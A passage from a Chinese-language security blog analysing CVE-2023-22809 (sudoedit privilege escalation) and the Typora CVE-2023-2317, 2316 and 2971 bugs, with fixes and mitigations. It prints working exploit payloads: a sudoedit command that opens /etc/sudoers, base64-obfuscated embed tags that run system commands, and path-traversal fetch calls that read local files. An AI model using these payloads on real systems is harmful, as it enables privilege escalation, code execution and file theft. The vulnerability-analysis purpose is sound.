<span class="type">int</span> *argc_out, <span class="type">char</span> ***argv_out,</span></span><br><span class="line"><span class="params">            <span class="type">char</span> * <span class="type">const</span> *allowlist, <span class="type">const</span> <span class="type">char</span> **env_editor)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    *env_editor = <span class="literal">NULL</span>;</span><br><span class="line">    ev[<span class="number">0</span>] = <span class="string">&quot;SUDO_EDITOR&quot;</span>;</span><br><span class="line">    ev[<span class="number">1</span>] = <span class="string">&quot;VISUAL&quot;</span>;</span><br><span class="line">    ev[<span class="number">2</span>] = <span class="string">&quot;EDITOR&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nitems(ev); i++) &#123;</span><br><span class="line">        <span class="type">char</span> *editor = getenv(ev[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (editor != <span class="literal">NULL</span> &amp;&amp; *editor != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">            *env_editor = editor;</span><br><span class="line">            <span class="comment">/* 解析环境变量的值 */</span></span><br><span class="line">            editor_path = resolve_editor(editor, <span class="built_in">strlen</span>(editor),</span><br><span class="line">                                         nfiles, files, argc_out, argv_out, allowlist);</span><br><span class="line">            <span class="keyword">if</span> (editor_path != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (errno != ENOENT)</span><br><span class="line">                debug_return_str(<span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>如果设置了环境变量，就调用 resolve_editor 函数去解析，问题就出在这个函数中，以下为关键代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *</span><br><span class="line"><span class="title function_">resolve_editor</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *ed, <span class="type">size_t</span> edlen, <span class="type">int</span> nfiles, <span class="type">char</span> **files,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> *argc_out, <span class="type">char</span> ***argv_out, <span class="type">char</span> * <span class="type">const</span> *allowlist)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"><span class="comment">//从编辑器名称（vim）后的字符串直接开始，通过wordsplit来计算参数（nargc）的数量。</span></span><br><span class="line">    <span class="keyword">for</span> (nargc = <span class="number">1</span>, tmp = ep; wordsplit(<span class="literal">NULL</span>, edend, &amp;tmp) != <span class="literal">NULL</span>; )</span><br><span class="line">        nargc++;</span><br><span class="line">    <span class="keyword">if</span> (nfiles != <span class="number">0</span>)</span><br><span class="line">        nargc += nfiles + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//根据参数数量申请对应大小的空间（nfiles即要编辑的文件数量）</span></span><br><span class="line">    nargv = reallocarray(<span class="literal">NULL</span>, nargc + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="type">char</span> *));</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill in editor argv (assumes files[] is NULL-terminated). */</span></span><br><span class="line">    nargv[<span class="number">0</span>] = editor;</span><br><span class="line">    editor = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//把参数拷贝到nargv数组中</span></span><br><span class="line">    <span class="keyword">for</span> (nargc = <span class="number">1</span>; (cp = wordsplit(<span class="literal">NULL</span>, edend, &amp;ep)) != <span class="literal">NULL</span>; nargc++) &#123;</span><br><span class="line">        <span class="comment">/* Copy string, collapsing chars escaped with a backslash. */</span></span><br><span class="line">        nargv[nargc] = copy_arg(cp, ep - cp);</span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">//nargv[]=&#123;&#x27;vim&#x27;,&#x27;--&#x27;,&#x27;/etc/sudoers&#x27;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nfiles != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//出问题的点</span></span><br><span class="line">        nargv[nargc++] = (<span class="type">char</span> *)<span class="string">&quot;--&quot;</span>;</span><br><span class="line">        <span class="comment">//nargv[]=&#123;&#x27;vim&#x27;,&#x27;--&#x27;,&#x27;/etc/sudoers&#x27;,&#x27;--&#x27;&#125;</span></span><br><span class="line">        <span class="keyword">while</span> (nfiles--)</span><br><span class="line">            nargv[nargc++] = *files++;</span><br><span class="line">         <span class="comment">//nargv[]=&#123;&#x27;vim&#x27;,&#x27;--&#x27;,&#x27;/etc/sudoers&#x27;,&#x27;--&#x27;,&#x27;/etc/custom_test.txt&#x27;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    nargv[nargc] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    *argc_out = nargc;</span><br><span class="line">    *argv_out = nargv;<span class="comment">//最后的输出部分，用于接下来的sudoedit</span></span><br><span class="line">    <span class="comment">//此时，nargv[3]=&#x27;--&#x27;</span></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>所以如果执行 Payload：</p>
-<p>最后一步：sudo_edit</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">最后一步：sudo_edit</span><br><span class="line"></span><br><span class="line"><span class="comment">// src/sudo_edit.c@sudo_edit()</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">sudo_edit</span><span class="params">(<span class="keyword">struct</span> command_details *command_details)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Set real, effective and saved uids to root.</span></span><br><span class="line"><span class="comment">* We will change the euid as needed below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="comment">//设置了ROOT权限和临时可写目录</span></span><br><span class="line">    setuid(ROOT_UID);</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="comment">/* Find a temporary directory writable by the user. */</span></span><br><span class="line">    set_tmpdir(&amp;user_details.cred);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * The user&#x27;s editor must be separated from the files to be</span></span><br><span class="line"><span class="comment">    * edited by a &quot;--&quot; option.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="comment">//argv[]=&#123;&#x27;vim&#x27;,&#x27;--&#x27;,&#x27;/etc/sudoers&#x27;,&#x27;--&#x27;,&#x27;/etc/custom_test.txt&#x27;&#125;</span></span><br><span class="line"><span class="keyword">for</span> (ap = command_details-&gt;argv; *ap != <span class="literal">NULL</span>; ap++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (files)</span><br><span class="line">        nfiles++;</span><br><span class="line">    <span class="comment">//命令行参数与--比较，如果相同则将下一个内容视为要编辑的文件名</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(*ap, <span class="string">&quot;--&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        files = ap + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        editor_argc++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUDO_EDITOR=<span class="string">&#x27;vim -- /etc/sudoers&#x27;</span> sudoedit /etc/custom_test.txt</span><br></pre></td></tr></table></figure>
-<p> 其中的“—”就会让/etc/sudoers对应的临时文件可以被编辑，从进程中也能看到： </p>
-<p><img src="/categories/CTF/CVE-2023-22809/1693147033838.png" alt="1693147033838"></p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/sudo-project/sudo/commit/0274a4f3b403162a37a10f199c989f3727ed3ad4">https://github.com/sudo-project/sudo/commit/0274a4f3b403162a37a10f199c989f3727ed3ad4</a></p>
-</blockquote>
-<p> 如果出现以下提示，说明漏洞已经修复： </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * We use &quot;--&quot; to separate the editor and arguments from the files</span><br><span class="line"> * to edit.  The editor arguments themselves may not contain &quot;--&quot;.</span><br><span class="line"> */</span><br><span class="line">if (strcmp(nargv[nargc], &quot;--&quot;) == 0) &#123;</span><br><span class="line">    sudo_warnx(U_(&quot;ignoring editor: %.*s&quot;), (int)edlen, ed);</span><br></pre></td></tr></table></figure>
-<p><img src="/categories/CTF/CVE-2023-22809/1693140214261.png" alt="1693140214261"></p>
-<h3 id="简单补丁"><a href="#简单补丁" class="headerlink" title="简单补丁"></a>简单补丁</h3><p> 把受影响的环境变量添加到拒绝列表中。 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">defaults!SUDOEDIT env_delete+=&quot;SUDO_EDITOR VISUAL EDITOR&quot;</span><br><span class="line">Cmnd_Alias SUDOEDIT = sudoedit /etc/custom/service.conf</span><br><span class="line">user ALL=(ALL:ALL) SUDOEDIT</span><br></pre></td></tr></table></figure>
-<p> 通过sudoedit命令仅编辑<code>/etc/custom/service.conf</code>文件，并且您希望禁用他们使用<code>SUDO_EDITOR</code>、<code>VISUAL</code>和<code>EDITOR</code>这些环境变量来更改默认编辑器。 </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/CVE-2023-2317/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/CVE-2023-2317/" class="post-title-link" itemprop="url">CVE-2023-2317 Typora远程代码执行漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-08-27 14:19:49" itemprop="dateCreated datePublished" datetime="2023-08-27T14:19:49+08:00">2023-08-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-08-30 12:18:27" itemprop="dateModified" datetime="2023-08-30T12:18:27+08:00">2023-08-30</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hMMqhVxx8YBokNrSM-__fQ">CVE-2023-2317 Typora远程代码执行漏洞</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.ctfiot.com/131732.html">CVE-2023-2971Typora Local File Disclosure (Patch Bypass)</a></p>
-</blockquote>
-<p> Windows和Linux版本1.6.7之前的Typora中的updater/update.html中存在基于DOM的XSS，该漏洞允许通过加载特制的markdown文件从而使得执行任意JavaScript代码。如果用户打开恶意markdown文件或者从恶意网页复制文本并将其粘贴到Typora，通过在＜embed＞标签中引用update.html，则可以利用此漏洞，此外，攻击者可以使用特权接口reqnode访问节点模块child_process并执行任意系统命令。 </p>
-<p>在Typora中嵌入下面的两个标签，渲染后人眼无法看到任何内容。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgd3d3LmV4cHBvYy5vcmcnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;notepad www.exppoc.org&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br></pre></td></tr></table></figure>
-<p>其中，</p>
-<p> %22 :”</p>
-<p> %2f :/</p>
-<p> %3c :&lt;</p>
-<p>base64编码的内容为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reqnode(&#x27;child_process&#x27;).exec(</span><br><span class="line">(&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)</span><br><span class="line">[navigator.platform.substr(0,5)])</span><br><span class="line">reqnode(&#x27;child_process&#x27;).exec(</span><br><span class="line">(&#123;Win32: &#x27;notepad www.exppoc.org&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)</span><br><span class="line">[navigator.platform.substr(0,5)])</span><br></pre></td></tr></table></figure>
-<embed style="height:0;" src="typora://resources/app/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgd3d3LmV4cHBvYy5vcmcnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ=='))><%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]">
-
-<h2 id="2317漏洞原理"><a href="#2317漏洞原理" class="headerlink" title="2317漏洞原理"></a>2317漏洞原理</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">      <span class="keyword">var</span> curVersion = <span class="regexp">/[?&amp;]curVersion=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">var</span> newVersion = <span class="regexp">/[?&amp;]newVersion=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">var</span> labels = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="built_in">decodeURIComponent</span>(<span class="regexp">/[?&amp;]labels=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#sum&quot;</span>).<span class="property">innerText</span> = labels[<span class="number">4</span>] + <span class="string">&quot; &quot;</span> + labels[<span class="number">5</span>].<span class="title function_">replace</span>(<span class="string">&quot;$1&quot;</span>, newVersion).<span class="title function_">replace</span>(<span class="string">&quot;$2&quot;</span>, curVersion);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;[data-label]&quot;</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">dom</span>)&#123;</span><br><span class="line">        dom.<span class="property">innerHTML</span> = labels[dom.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-label&quot;</span>) - <span class="number">0</span>];</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> autoUpdateInput = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#preference-enable-auto-update&quot;</span>)</span><br><span class="line">      autoUpdateInput.<span class="property">checked</span> = !!isAutoUpdateEnabled;</span><br><span class="line">      autoUpdateInput.<span class="property">onchange</span> = toggleAutoUpdate;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p> <code>window.location.search</code>: 返回URL的查询字符串，即”?”后面的部分。 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curVersion=111&amp;newVersion=222&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>数组索引 <code>0</code> 将包含整个匹配，例如：<code>newVersion=222</code></li>
-<li>数组索引 <code>1</code> 将只包含捕获组的匹配，即：<code>222</code></li>
-</ul>
-<p>此时，curVersion被设置为111，newVersion被设置为222。</p>
-<p>JSON.parse后，labels被设置为Javascript数组：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;&quot;,&quot;&lt;svg/onload=top.eval(atob(&#x27;b64_string&#x27;))&gt;&lt;/svg&gt;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;]</span><br></pre></td></tr></table></figure>
-<p>含有6个元素的labels数组，</p>
-<p> 在顶级窗口上下文中执行解码后的字符串作为JavaScript代码。 </p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在0.9beta版本里，发现并不能够成功执行payload.</p>
-<p>首先，是updater.html的路径不对。</p>
-<p><a href="#2971漏洞原理">1.6.7之后的版本</a>，可以把”typora://app/typemark”解析成 [Typora Installation Absolute Path]/resources/ ，但是0.9版本没有这个功能；</p>
-<p>而且两个版本的目录也有很大差异。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typora://resources/app/updater/updater.html</span><br></pre></td></tr></table></figure>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://resources/app/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br><span class="line">​```</span><br><span class="line">reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br><span class="line">​```</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://resources/app/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgd3d3LmV4cHBvYy5vcmcnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br><span class="line">​```</span><br><span class="line">reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;notepad www.exppoc.org&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br><span class="line">​```</span><br></pre></td></tr></table></figure>
-<p>修改后，发现成功触发到updater.html。</p>
-<p><img src="/categories/CTF/CVE-2023-2317/1693365459596.png" alt="1693365459596"></p>
-<p> 但是SVG元素的<code>onload</code>事件代码被浏览器阻止了，因为它尝试在一个跨域的frame中访问当前的frame，这违反了同源策略。</p>
-<p><img src="/categories/CTF/CVE-2023-2317/1693365876426.png" alt="1693365876426"></p>
-<h2 id="CVE-2023-2316-路径遍历漏洞"><a href="#CVE-2023-2316-路径遍历漏洞" class="headerlink" title="CVE-2023-2316 路径遍历漏洞"></a>CVE-2023-2316 路径遍历漏洞</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;typora://app/C:/windows/win.ini&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(r)&#125;)</span><br></pre></td></tr></table></figure>
-<p><img src="/categories/CTF/CVE-2023-2317/1693367774824.png" alt="1693367774824"></p>
-<p>仍然是针对Typora1.6.5的，0.9很安全。</p>
-<h3 id="2316漏洞修补"><a href="#2316漏洞修补" class="headerlink" title="2316漏洞修补"></a>2316漏洞修补</h3><p>在Typora 1.6.5中添加了一个健全性检查， </p>
-<p><code>[1]</code> 以确保路径以字符串 <code>typemark</code> 开头，</p>
-<p>[2]消除了传递以 <code>/</code>  或者<code>C:\\</code> 开头的绝对路径的可能性。 </p>
-<h3 id="2316修补的绕过"><a href="#2316修补的绕过" class="headerlink" title="2316修补的绕过"></a>2316修补的绕过</h3><ul>
-<li><p>Approach 1: Using <code>..%5C</code> (Windows-only):<br>方法 1：使用 URL编码<code>..%5C</code> （仅限 Windows）：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;typora://app/typemark/..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows/win.ini&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(r)&#125;)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Approach 2: Passing <code>../</code> in URL fragment <code>#</code>:<br>方法 2：URL 片段 <code>#</code> 中传入 <code>../</code> ：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;typora://app/typemark#../../../../../../../../Windows/win.ini&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(r)&#125;)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h2 id="CVE-2023-2971路径遍历漏洞"><a href="#CVE-2023-2971路径遍历漏洞" class="headerlink" title="CVE-2023-2971路径遍历漏洞"></a>CVE-2023-2971路径遍历漏洞</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p> Typora for Windows/Linux &lt; 1.7.0-dev<br> 实际测试的版本：</p>
-<p>Typora for Windows 1.6.7, Typora for Linux 1.6.6 </p>
-<p> 在Windows和Linux上的1.7.0-dev之前，Typora中的不当路径处理允许构建的网页访问本地文件并通过“typora://app/typemark/”将其泄露到远程Web服务器。如果用户在 Typora 中打开恶意md文件，或从恶意网页复制文本并将其粘贴到 Typora 中，则可利用此漏洞。 </p>
